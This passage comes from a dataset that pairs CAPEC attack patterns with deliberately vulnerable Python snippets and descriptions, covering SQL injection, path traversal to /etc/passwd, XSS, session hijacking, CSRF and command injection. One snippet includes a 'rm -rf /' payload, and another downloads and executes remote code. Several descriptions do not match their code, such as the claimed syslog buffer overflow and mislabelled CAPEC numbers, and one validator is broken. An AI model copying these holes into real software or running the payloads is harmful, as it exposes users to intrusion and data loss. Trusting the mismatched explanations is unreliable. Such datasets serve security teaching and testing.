        "code_snippet": "import hashlib\n\n# CWE-261: Weak Encoding for Password\npassword = 'mypassword'\nhashed_password = hashlib.md5(password.encode()).hexdigest()\n\n# CWE-521: Weak Password Requirements\npassword_requirements = {'min_length': 6, 'special_chars': False}\n\n# CWE-262: Not Using Password Aging\npassword_expiration = None\n\n# CWE-263: Password Aging with Long Expiration\npassword_expiration_period = 365\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\nsingle_factor_auth = True\n\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\nhash_iterations = 1\n\n# CWE-308: Use of Single-factor Authentication\nsingle_factor_auth = True\n\n# CWE-309: Use of Password System for Primary Authentication\nprimary_auth_method = 'password'\n\n# CAPEC: Rainbow Table Attack\nrainbow_table = {'hashed_password': 'original_password'}\n\n# Attacker gets access to the database table where hashes of passwords are stored\nstolen_hashes = [hashed_password]\n\n# Attacker uses a rainbow table of pre-computed hash chains to attempt to look up the original password\nfor hash in stolen_hashes:\n    if hash in rainbow_table:\n        original_password = rainbow_table[hash]\n        print('Original password found:', original_password)\n        # Attacker uses the original password to gain access to the system\n        print('Access granted!')\n    else:\n        print('Original password not found in rainbow table')",
        "description": "This code snippet demonstrates a vulnerable password storage and authentication system that is susceptible to a rainbow table attack. The system uses weak password hashing (MD5), has weak password requirements, and lacks password aging. It also relies on single-factor authentication and uses password systems as the primary means of authentication. An attacker can use a rainbow table to look up the original password corresponding to the stolen hash, and then use the original password to gain access to the system."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # The client is responsible for hashing the password\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    # CWE-294: Authentication Bypass by Capture-replay\n    # The client sends the hashed password to the server\n    return send_to_server(username, hashed_password)\n\ndef send_to_server(username, hashed_password):\n    # CWE-693: Protection Mechanism Failure\n    # The server does not verify the username and password\n    return True\n\ndef optimize_code(func):\n    # CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n    # The compiler optimizes the code, removing the authentication mechanism\n    return func\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# The authentication mechanism is removed or bypassed\nauthenticate = optimize_code(authenticate)\n",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern, which is a duplicate of CAPEC-207: Removing Important Client Functionality. It includes multiple CWEs, including CWE-602: Client-Side Enforcement of Server-Side Security, CWE-294: Authentication Bypass by Capture-replay, CWE-693: Protection Mechanism Failure, and CWE-733: Compiler Optimization Removal or Modification of Security-critical Code. The code allows a malicious user to bypass authentication by capturing and replaying the hashed password, and the compiler optimization removes the authentication mechanism, making it vulnerable to attacks."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# CWE-287: Improper Authentication\nusername = 'admin'\npassword = 'password'\n\n# CWE-642: External Control of Critical State Data\nuser_data = {'username': username, 'password': password}\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'https://example.com/login'\nresponse = requests.get(url, params=user_data, verify=False)\n\n# CWE-693: Protection Mechanism Failure\nif response.status_code == 200:\n    print('Login successful!')\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # No verification of the identity of actors at both ends of the communication channel\n    # CWE-287: Improper Authentication\n    # No proof that the claim of identity is correct\n    sensitive_data = response.json()['sensitive_data']\n    print('Sensitive data:', sensitive_data)\n",
        "description": "This code snippet demonstrates a REST-style application that is vulnerable to a man-in-the-middle attack. It uses the GET method to send sensitive information in the query string, and does not properly verify the identity of the actor at the other end of the communication channel. The code also fails to use a protection mechanism to defend against directed attacks, and stores sensitive user data in an accessible location."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n# Define a privileged function that can modify or delete data\ndef modify_data(id, data):\n    # No access control or authorization checks\n    if request.method == 'GET':\n        # Assume GET requests are safe and won't modify data\n        return {'message': 'Data retrieved successfully'}\n    elif request.method == 'PUT':\n        # No privilege checks, allowing unauthorized modifications\n        # CWE-267, CWE-269, CWE-285\n        return {'message': 'Data modified successfully'}\n    elif request.method == 'DELETE':\n        # No access control, allowing unauthorized deletions\n        # CWE-267, CWE-269, CWE-285\n        return {'message': 'Data deleted successfully'}\n\n@app.route('/data/<id>', methods=['GET', 'PUT', 'DELETE'])\ndef handle_data(id):\n    data = {'id': id, 'value': 'some_value'}\n    return modify_data(id, data)\n\nif __name__ == '__main__':\n    app.run()",
        "description": "A Flask API that lacks access control mechanisms, allowing unauthorized modifications and deletions of data through GET, PUT, and DELETE requests."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        # CWE-330: Insufficiently random values\n        session_id = str(random.randint(1, 1000))\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def authenticate(self, session_id):\n        # CWE-290: Authentication Bypass by Spoofing\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n# CWE-346: Origin Validation Error\n# CWE-488: Exposure of Data Element to Wrong Session\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length\n# CWE-285: Improper Authorization\n# CWE-384: Session Fixation\n# CWE-693: Protection Mechanism Failure\n\nmanager = SessionManager()\nuser_id = 'admin'\n\n# Predictable session ID\nsession_id = manager.create_session(user_id)\n\n# Spoofing and session hijacking\nstolen_session_id = '42'\nprint(manager.authenticate(stolen_session_id))",
        "description": "This code snippet demonstrates a vulnerable session management system that uses predictable session IDs, allowing an attacker to spoof and hijack sessions. The session ID is generated using a weak random number, making it easy to predict. The authenticate function does not properly validate the session ID, allowing an attacker to access sensitive information. This code embodies the main idea of the CAPEC, which targets predictable session IDs to gain privileges."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import requests\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-290: Authentication Bypass by Spoofing\n\n# Stolen session ID\nstolen_session_id = 'session_id_from_previous_transaction'\n\n# CWE-346: Origin Validation Error\n# No validation of the source of the request\nurl = 'https://example.com/protected_resource'\nheaders = {'Cookie': 'session_id=' + stolen_session_id}\n\n# CWE-384: Session Fixation\n# No invalidation of existing session identifier\nresponse = requests.get(url, headers=headers)\n\n# CWE-488: Exposure of Data Element to Wrong Session\n# Data is provided to the wrong session\nif response.status_code == 200:\n    print('Session hijacked successfully!')\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# Persistent cookie containing sensitive information\ncookie = {'session_id': stolen_session_id, 'user_data': 'sensitive_info'}\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Sensitive information exposed to unauthorized actor\nprint('Sensitive information:', cookie['user_data'])\n\n# CWE-285: Improper Authorization\n# No authorization check performed\n# CWE-664: Improper Control of a Resource Through its Lifetime\n# No control over resource throughout its lifetime\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Incorrect permission assignment for critical resource\n",
        "description": "Python code snippet demonstrating a Session Replay attack, where an attacker reuses a stolen session ID to spoof the target system and gain privileges. The code highlights various CWEs, including Authentication Bypass by Capture-replay, Authentication Bypass by Spoofing, Origin Validation Error, Session Fixation, Exposure of Data Element to Wrong Session, Use of Persistent Cookies Containing Sensitive Information, Exposure of Sensitive Information to an Unauthorized Actor, Improper Authorization, Improper Control of a Resource Through its Lifetime, and Incorrect Permission Assignment for Critical Resource."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\nusers = {'user1': 'password1', 'user2': 'password2'}\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if flask.request.method == 'POST':\n        username = flask.request.form['username']\n        password = flask.request.form['password']\n        if username in users and users[username] == password:\n            # Set the session ID without invalidating the existing one\n            flask.session['username'] = username\n            return 'Login successful'\n    return '<form action=\"/login\" method=\"post\"><input type=\"text\" name=\"username\"><input type=\"password\" name=\"password\"><input type=\"submit\"></form>'\n\n@app.route('/admin', methods=['GET'])\ndef admin():\n    if 'username' in flask.session:\n        # Allow access to the admin page without checking the session ID\n        return 'Welcome, admin!'\n    return 'Access denied'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a session fixation vulnerability (CWE-384). The login function sets the session ID without invalidating the existing one, allowing an attacker to fixate the session ID and gain unauthorized access to the admin page. The code also exhibits improper control of a resource throughout its lifetime (CWE-664) and incorrect permission assignment for a critical resource (CWE-732). Additionally, it relies on client-side enforcement of server-side security (CWE-602) and generates incorrect security tokens (CWE-1270)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import requests\n\n# CWE-306: Missing Authentication for Critical Function\n# CWE-664: Improper Control of a Resource Through its Lifetime\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n\n# Assume a vulnerable web application with a critical function to delete user data\n# The function is accessible via a GET request and does not verify user identity\n\ndef delete_user_data(session_cookie):\n    url = 'https://vulnerable-app.com/delete_user_data'\n    headers = {'Cookie': session_cookie}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        print('User data deleted successfully')\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n# CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n\n# Malicious link crafted to exploit the vulnerability\nmalicious_link = '<img src=\"https://vulnerable-app.com/delete_user_data\" />\n\n# Distribute the malicious link via email or web page\n# When the user clicks the link, the request will be sent with the user's session cookie\n# The vulnerable application will process the request without verifying user identity\n",
        "description": "This code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack, leveraging missing authentication for critical functions, improper control of resources, and incorrect permission assignment. A malicious link is crafted to exploit the vulnerability, which, when clicked, will send a request to the vulnerable application with the user's session cookie, allowing the attacker to delete user data without authentication."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    username = request.form['username']\n    comment = request.form['comment']\n    html = '<div><b>' + username + '</b> says: <i>' + comment + '</i></div>'\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to Cross-Site Scripting (XSS) attacks. The add_comment function takes user input from a form and injects it directly into an HTML response without proper validation or sanitization, allowing an attacker to inject malicious scripts. This is an example of CWE-79: Improper Neutralization of Input During Web Page Generation, CWE-20: Improper Input Validation, CWE-692: Incomplete Denylist to Cross-Site Scripting, CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page, and CWE-81: Improper Neutralization of Script in an Error Message Web Page."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef vulnerable_url_parser(url):\n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    parsed_url = urllib.parse.unquote(url)\n    # CWE-73: External Control of File Name or Path\n    # CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n    file_path = \"/var/www/\" + parsed_url\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-20: Improper Input Validation\n    if \"../\" in file_path:\n        return \"Access denied\"\n    else:\n        return file_path\n\n# Example usage\nurl = \"%2e%2e/%2e%2e/%etc/passwd\"\nprint(vulnerable_url_parser(url))",
        "description": "This Python code snippet demonstrates a vulnerable URL parser that is susceptible to URL encoding attacks. It fails to properly handle URL encoding, alternate encoding, and encoding errors, allowing an attacker to craft a malicious URL that can bypass access controls and traverse the file system. The code also lacks proper input validation and neutralization of special elements, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import socket\nimport requests\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n# CWE-693: Protection Mechanism Failure\n# CWE-494: Download of Code Without Integrity Check\n\ndef download_and_execute_code():\n    # Establish a connection to the server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('example.com', 8080))\n\n    # Send a request to download the code\n    request = 'GET /download_code HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\n    sock.send(request.encode())\n\n    # Receive the code\n    response = sock.recv(1024)\n    code = response.decode()\n\n    # Execute the received code\n    exec(code)\n\n    # Store sensitive information in cleartext\n    sensitive_data = 'username:password'\n    with open('sensitive_info.txt', 'w') as f:\n        f.write(sensitive_data)\n\n# Download and execute the code\ndownload_and_execute_code()",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary passively sniffs network communications and captures application code bound for an authorized client. The code downloads executable code from a remote location without verifying its origin and integrity, and then executes it. Additionally, it stores sensitive information in cleartext, violating multiple CWEs."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\ndef get_user(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    return user\n\nusername = input(\"Enter your username: \")\nuser = get_user(username)\nif user:\n    print(\"Welcome, \" + user[1])\nelse:\n    print(\"User not found\")",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability. The get_user function constructs an SQL query using user input without proper validation or sanitization, allowing an attacker to inject malicious SQL code. For example, an attacker could enter a username like ' OR 1=1 --' to retrieve all users from the database. The code also lacks proper error handling, potentially leading to sensitive information disclosure (CWE-209). Additionally, the database cursor is not properly closed, leaving it 'dangling' (CWE-619)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef vulnerable_syslog(user_input):\n    syslog.syslog(user_input)\n\n# Example usage:\nuser_input = '%s%s%s%s%s'  # Malicious format string\nvulnerable_syslog(user_input)",
        "description": "This Python code snippet demonstrates a format string injection vulnerability in the syslog() function. The vulnerable_syslog() function takes user input and passes it directly to syslog.syslog() without proper validation or sanitization. An attacker can inject malicious format string commands, leading to a buffer overflow (CWE-120) due to the use of an externally-controlled format string (CWE-134). This is a result of improper input validation (CWE-20) and can be exploited to cause a buffer overflow, which can lead to code execution."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# CWE-328: Use of Weak Hash\nweak_hash = hashlib.md5\n\n# CWE-325: Missing Cryptographic Step\ndef sign_code(code):\n    # Missing cryptographic step: not using a secure hash function\n    return weak_hash(code.encode()).hexdigest()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"import os; os.system('rm -rf /')\"\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# Assuming the compiler optimizes out the security check\nif False:\n    # Security check removed by compiler optimization\n    if sign_code(malicious_code) != sign_code(malicious_code):\n        raise Exception('Code tampering detected')\n\n# CWE-1326: Missing Immutable Root of Trust in Hardware\n# Assuming the hardware allows bypassing secure boot\nif False:\n    # Bypassing secure boot\n    exec(malicious_code)\n",
        "description": "This Python code snippet demonstrates a vulnerability in code signing, allowing an attacker to subvert the mechanism and escalate privileges. It uses a weak hash function (MD5) for code signing, omits a required cryptographic step, and contains embedded malicious code. The code also assumes that the compiler optimizes out a security check and that the hardware allows bypassing secure boot, further compromising the security of the system."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\n\ndef run_command_with_elevated_privileges(command):\n    return os.system(command)\n\n# CWE-250: Running with unnecessary privileges\n# CWE-15: External control of system or configuration setting\n# CWE-114: Process control from an untrusted source\n# CWE-506: Embedded malicious code\n# CWE-78: OS command injection\n\n# Get user input for the command to run\nuser_input = input(\"Enter a command to run: \")\n\n# Run the command with elevated privileges\nrun_command_with_elevated_privileges(user_input)",
        "description": "This code snippet demonstrates the CAPEC of executing arbitrary code with elevated privileges. It defines a function to run a command with elevated privileges using the os.system function. The function takes user input for the command to run, which can lead to OS command injection (CWE-78). The code runs with unnecessary privileges (CWE-250), allowing an attacker to execute malicious commands. The user input can also be controlled externally (CWE-15), and the code executes commands from an untrusted source (CWE-114). Furthermore, the code may contain embedded malicious code (CWE-506) that can be exploited by an attacker."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\nusername = 'admin'\npassword = 'password123'\n\n# Weak password requirements (CWE-521)\ndef validate_password(password):\n    return len(password) > 0\n\n# No password aging mechanism (CWE-262)\ndef check_password_expiration(password):\n    return True\n\n# Single-factor authentication (CWE-308)\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    return False\n\n# Reliance on a single factor in a security decision (CWE-654)\ndef grant_access(username):\n    if authenticate(username, getpass.getpass('Enter password: ')):\n        print('Access granted')\n    else:\n        print('Access denied')\n\ngrant_access('admin')",
        "description": "This code snippet demonstrates a vulnerable authentication system that embodies the CAPEC. It uses hard-coded credentials, has weak password requirements, lacks password aging, and relies on single-factor authentication. An attacker can easily gain access to the system by using the default credentials or by brute-forcing the password."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef validate_input(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-176: Improper Handling of Unicode Encoding\n    if not isinstance(user_input, str):\n        return False\n    \n    # CWE-179: Incorrect Behavior Order: Early Validation\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    user_input = urllib.parse.unquote(user_input)\n    \n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    if '%' in user_input:\n        return False\n    \n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-183: Permissive List of Allowed Inputs\n    disallowed_chars = ['<', '>', '&', '=']\n    for char in disallowed_chars:\n        if char in user_input:\n            return False\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-697: Incorrect Comparison\n    if user_input.lower() == 'allowed_input':\n        return True\n    \n    return False\n\n# CWE-692: Incomplete Denylist to Cross-Site Scripting\nallowed_input = '<script>alert(\"allowed\")</script>'\nuser_input = '<script>alert(\"xss\")</script>'\nif validate_input(user_input):\n    print('Input is allowed')\nelse:\n    print('Input is not allowed')",
        "description": "This code snippet demonstrates a vulnerable input validation mechanism that can be bypassed using Unicode encoding and alternate encoding. The validate_input function does not properly handle Unicode encoding, and it validates input before applying protection mechanisms that modify the input. The function also uses an incomplete list of disallowed inputs and does not properly neutralize special elements in output used by a downstream component. An attacker can provide a malicious input that bypasses the validation and causes the application to route the request incorrectly."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import urllib.parse\n\ndef get_file_from_url(url):\n    parsed_url = urllib.parse.urlparse(url)\n    file_path = urllib.parse.unquote_plus(parsed_url.path)\n    return file_path\n\nurl = input('Enter URL: ')\nfile_path = get_file_from_url(url)\n\nwith open(file_path, 'r') as f:\n    print(f.read())",
        "description": "This Python code snippet is vulnerable to URL encoding attacks. It takes a URL as input, parses it, and uses the path component to read a file from the local filesystem. The unquote_plus function is used to decode the URL, but it does not properly handle alternate encodings, allowing an attacker to inject malicious file paths. This code is vulnerable to CWE-173, CWE-177, CWE-172, CWE-73, CWE-74, and CWE-20."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\n\ndef generate_html(filename):\n    html = '<a href=\"' + filename + '\">Click here</a>'\n    return html\n\nfilename = request.form['filename']\nhtml = generate_html(filename)\n\nwith open('user_generated.html', 'w') as f:\n    f.write(html)\n\nprint('HTML file generated successfully!')",
        "description": "This Python code snippet demonstrates a vulnerable code that allows an attacker to inject malicious code into a dynamically generated HTML file. The code receives user input for a filename, uses it to generate an HTML link, and writes it to a file. The code does not validate or neutralize the input, making it vulnerable to XSS attacks. An attacker can inject malicious code into the filename, which will be executed when the generated HTML file is opened in a browser."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\n\nclass ShoppingCart:\n    def __init__(self):\n        self.items = {}\n        self.state = 'initialized'\n\n    def add_item(self, item):\n        if self.state == 'initialized':\n            self.items[item] = 1\n        else:\n            # CWE-372: Incomplete Internal State Distinction\n            # Assuming the state is 'initialized' when it's not\n            self.items[item] = 1\n\n    def checkout(self):\n        if self.state == 'initialized':\n            # CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n            cookie = {'username': 'user', 'payment_info': '1234-5678-9012-3456'}\n            print('Checkout successful!')\n        else:\n            print('Error: Invalid state')\n\n    def transmit_data(self):\n        data = {'items': self.items, 'state': self.state}\n        # CWE-353: Missing Support for Integrity Check\n        # No integrity check for transmitted data\n        print('Transmitting data...')\n\n    def receive_data(self, data):\n        # CWE-693: Protection Mechanism Failure\n        # No validation of received data\n        self.items = data['items']\n        self.state = data['state']\n\n    def fsm_transition(self):\n        # CWE-1245: Improper Finite State Machines (FSMs) in Hardware Logic\n        # Incorrect finite state machine transition\n        if self.state == 'initialized':\n            self.state = 'invalid_state'\n        else:\n            self.state = 'initialized'\n\n    def set_security_settings(self):\n        # CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n        # Security settings not set to a known value on reset\n        self.security_settings = None\n\n    def reentrant_code(self):\n        # CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n        # Nested call to non-reentrant code\n        self.reentrant_code()\n\n\n# Example usage\nshopping_cart = ShoppingCart()\nshopping_cart.add_item('item1')\nshopping_cart.checkout()\nshopping_cart.transmit_data()\nshopping_cart.receive_data({'items': {'item1': 1}, 'state': 'initialized'})\nshopping_cart.fsm_transition()\nshopping_cart.set_security_settings()\nshopping_cart.reentrant_code()",
        "description": "This code snippet demonstrates the CAPEC of modifying state information maintained by the target software, causing unintended behavior. It includes CWEs related to incomplete internal state distinction, cleartext storage of sensitive information, missing support for integrity checks, protection mechanism failure, improper finite state machines, unintended reentrant invocation of non-reentrant code, and uninitialized values on reset for registers holding security settings."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\n\n# CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\ntrusted_data = {'user_id': 1, 'role': 'admin'}\n\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nresource_id = input('Enter resource ID: ')\n\n# CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\ncommand = f'cat {resource_id}'\nos.system(command)\n\n# CWE-346: Origin Validation Error\nuntrusted_data = {'user_id': 2, 'role': 'user'}\nif untrusted_data['user_id'] == trusted_data['user_id']:\n    # CWE-353: Missing Support for Integrity Check\n    # CWE-354: Improper Validation of Integrity Check Value\n    trusted_data.update(untrusted_data)\n    print('Updated trusted data:', trusted_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable code that allows an attacker to modify trusted data by injecting malicious input. The code accepts user input for a resource ID, which is then used to construct a system command without proper validation. Additionally, the code updates trusted data with untrusted data without verifying its origin or integrity, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(file_path, 'r').read()\n\nuser_input = input('Enter a file path: ')\n\ntry:\n    print(read_file(user_input))\nexcept FileNotFoundError:\n    print('File not found')",
        "description": "This Python code snippet demonstrates the CAPEC of manipulating inputs to the target software to gain access to areas of the file system that the target software did not intend to be accessible. The code uses user input to construct a file path, which can lead to path traversal vulnerabilities (CWE-23, CWE-22). The code does not properly neutralize special elements within the pathname, allowing an attacker to access restricted directories. Additionally, the code does not perform proper authorization checks (CWE-285) and does not drop elevated privileges (CWE-272) when accessing the file system. This code is vulnerable to command injection (CWE-77) and external control of file name or path (CWE-73)."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\n# Vulnerable code snippet\nif 'DEBUG' in os.environ:\n    debug_mode = os.environ['DEBUG']\n    if debug_mode == '1':\n        # Allow user to override variables\n        user_input = input('Enter a variable to override: ')\n        globals()[user_input] = input('Enter a value for the variable: ')\n\n# Example of business logic controlled by the overridden variable\nif 'admin' in globals():\n    if globals()['admin'] == True:\n        print('You are an admin!')\n    else:\n        print('You are not an admin.')",
        "description": "This Python code snippet demonstrates the CAPEC, where an adversary can override variables leveraging user-supplied, untrusted input. The code uses the 'DEBUG' environment variable to allow the user to override variables, which can lead to improper control of system or configuration settings (CWE-15). The user-input variables can also lead to code injection (CWE-94) or static code injection (CWE-96) vulnerabilities. Furthermore, the code lacks proper authorization (CWE-285) and authentication checks, making it vulnerable to authentication bypass attacks (CWE-302). The code also resembles PHP external variable modification (CWE-473) and prototype pollution (CWE-1321) vulnerabilities."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef sanitize_filename(filename):\n    return filename.replace('/', '_').replace('\\\\', '_')\n\ndef create_file(filename, content):\n    sanitized_filename = sanitize_filename(filename)\n    with open(sanitized_filename, 'w') as f:\n        f.write(content)\n\nfilename = input('Enter a filename: ')\ncontent = input('Enter some content: ')\ncreate_file(filename, content)\n",
        "description": "This code snippet demonstrates the CAPEC of using backslash in alternate encoding to bypass security filters. The CWEs involved are CWE-180, CWE-181, CWE-173, CWE-172, CWE-73, CWE-22, CWE-74, CWE-20, CWE-697, and CWE-707. The code takes user input for a filename and content, and then creates a file with the provided content. The sanitize_filename function attempts to remove special characters from the filename, but it does not properly handle alternate encoding, allowing an attacker to inject malicious characters. For example, if the user inputs a filename with a backslash, the sanitize_filename function will replace it with an underscore, but the attacker can use an alternate encoding to bypass this filter and inject a malicious path."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-73: External Control of File Name or Path\n    # CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n    path = os.path.join('/var/www/html', user_input)\n    if os.path.exists(path):\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        return open(path, 'r').read()\n    else:\n        return 'File not found'\n\n# CWE-173: Improper Handling of Alternate Encoding\n# CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n# CWE-181: Incorrect Behavior Order: Validate Before Filter\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n# CWE-185: Incorrect Regular Expression\n# CWE-697: Incorrect Comparison\n# CWE-707: Improper Neutralization\nuser_input = '../../../../etc/passwd'\nvulnerable_function(user_input)\n",
        "description": "This code snippet demonstrates the CAPEC-63 attack pattern, which targets the encoding of the Slash characters. The vulnerable_function takes user input and uses it to construct a file path. The function does not properly validate the input, allowing an adversary to traverse the file system and access sensitive information. The code also demonstrates multiple CWEs, including improper input validation, external control of file name or path, and improper limitation of a pathname to a restricted directory."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef validate_input(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-173: Improper Handling of Alternate Encoding\n    if len(user_input) > 100:\n        return False\n    # CWE-172: Encoding Error\n    try:\n        user_input = user_input.encode('utf-8')\n    except UnicodeEncodeError:\n        return False\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    canonicalized_input = urllib.parse.unquote(user_input.decode('utf-8'))\n    if canonicalized_input != user_input.decode('utf-8'):\n        return False\n    # CWE-73: External Control of File Name or Path\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    file_path = f'/user_uploaded_files/{user_input.decode(\"utf-8\")}'\n    if '..' in file_path or '/' in file_path:\n        return False\n    # CWE-697: Incorrect Comparison\n    if user_input.decode('utf-8') != canonicalized_input:\n        return False\n    return True\n\nuser_input = input('Enter your input: ')\nif validate_input(user_input):\n    print('Input is valid')\nelse:\n    print('Input is not valid')",
        "description": "This code snippet demonstrates a vulnerable input validation function that is susceptible to UTF-8 encoding attacks. It highlights several CWEs, including improper input validation, encoding errors, incorrect behavior order, and external control of file names or paths. The function attempts to validate user input but fails to properly handle alternate encodings, canonicalization, and filtering, making it vulnerable to attacks."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
